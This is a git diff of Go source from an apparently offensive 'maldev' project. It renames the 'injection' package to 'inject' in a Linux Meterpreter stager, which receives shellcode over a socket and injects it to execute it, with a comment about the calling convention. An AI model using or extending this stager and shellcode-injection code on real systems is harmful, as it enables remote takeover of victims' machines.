@@ -18,7 +18,7 @@ import (
 	"runtime"
 	"time"
 
-	"github.com/oioio-space/maldev/injection"
+	"github.com/oioio-space/maldev/inject"
 )
 
 // keepAliveFiles prevents garbage collection of socket file descriptors.
@@ -49,11 +49,11 @@ func (s *Stager) stageLinux() error {
 		return fmt.Errorf("received payload too small (%d bytes), invalid stage", len(shellcode))
 	}
 
-	// Use injection.InjectMeterpreterWrapper which uses purego.SyscallN
+	// Use inject.InjectMeterpreterWrapper which uses purego.SyscallN
 	// for proper System V AMD64 ABI calling convention. The raw
 	// unsafe.Pointer function-pointer cast does not set up registers
 	// correctly on Linux and crashes.
-	return injection.InjectMeterpreterWrapper(sockfd, shellcode)
+	return inject.InjectMeterpreterWrapper(sockfd, shellcode)
 }
 
 // fetchStageLinux retrieves the stage and returns the socket fd.
